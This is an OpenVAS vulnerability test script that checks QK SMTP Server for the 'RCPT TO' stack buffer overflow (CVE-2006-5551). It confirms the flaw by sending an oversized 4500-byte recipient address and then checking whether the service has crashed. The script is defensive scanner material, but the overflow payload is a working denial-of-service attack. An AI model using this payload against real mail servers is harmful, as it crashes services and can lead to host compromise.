# OpenVAS Vulnerability Test
# $Id: qk_smtp_server_dos.nasl 13003 2019-01-09 15:42:03Z cfischer $
# Description: QK SMTP Server 'RCPT TO' buffer overflow vulnerability
#
# Authors:
# Ferdy Riphagen
#
# Copyright:
# Copyright (C) 2008 Ferdy Riphagen
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.2000201");
  script_version("$Revision: 13003 $");
  script_tag(name:"last_modification", value:"$Date: 2019-01-09 16:42:03 +0100 (Wed, 09 Jan 2019) $");
  script_tag(name:"creation_date", value:"2008-08-22 16:09:14 +0200 (Fri, 22 Aug 2008)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2006-5551");
  script_bugtraq_id(20681);
  script_name("QK SMTP Server 'RCPT TO' buffer overflow vulnerability");
  script_category(ACT_DENIAL);
  script_family("Gain a shell remotely");
  script_copyright("This script is Copyright (C) 2008 Ferdy Riphagen");
  script_dependencies("smtpserver_detect.nasl", "smtp_settings.nasl");
  script_require_ports("Services/smtp", 25);

  script_xref(name:"URL", value:"http://www.securiteam.com/exploits/6P00O15H6U.html");

  script_tag(name:"solution", value:"Upgrade to QK SMTP Server 3.1 beta or a newer release.");

  script_tag(name:"summary", value:"QK SMTP Server is installed on the remote host which is prone
  to a stack based overflow.");

  script_tag(name:"insight", value:"The application does not properly check it's boundaries for
  user supplied input in the 'RCPT TO' field.");

  script_tag(name:"impact", value:"This results in a stack based overflow, where it's possible to
  crash the service or compromise the host.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("smtp_func.inc");
include("misc_func.inc");

port = get_smtp_port(default:25);
soc = open_sock_tcp(port);
if (!soc) exit(0);

banner = smtp_recv_banner(socket:soc);
if ("QK SMTP Server" >< banner) {

 # This works regardless of the results from smtp_settings.nasl.
 domain = get_3rdparty_domain();
 sender = get_kb_item("SMTP/headers/From");
 helo = string("EHLO ", domain, "\r\n");
 from = string("MAIL FROM: ", sender, "\r\n");
 bof = string("RCPT TO: ", crap(data:raw_string(0x41), length:4500), "@", domain, "\r\n");

 # First send the HELO
 send(socket:soc, data:helo);
 recv = recv(socket:soc, length:1024);
 if ("250-Hello" >!< recv) exit(0);

 # From address
 send(socket:soc, data:from);
 recv = recv(socket:soc, length:1024);
 if ("Address Okay" >!< recv) exit(0);

 # The overflow
 send(socket:soc, data:bof);
 recv = recv(socket:soc, length:1024);
 if (soc) {
  send(socket:soc, data:string("QUIT\r\n"));
  close(soc);
 }

 soc = open_sock_tcp(port);
 if (soc) {
  line = smtp_recv_line(socket:soc, code:"220");
 }
 if (!soc || (!strlen(line))) {
  security_message(port);
 }
 if (soc) {
  send(socket:soc, data:string("QUIT\r\n"));
  close(soc);
 }
}
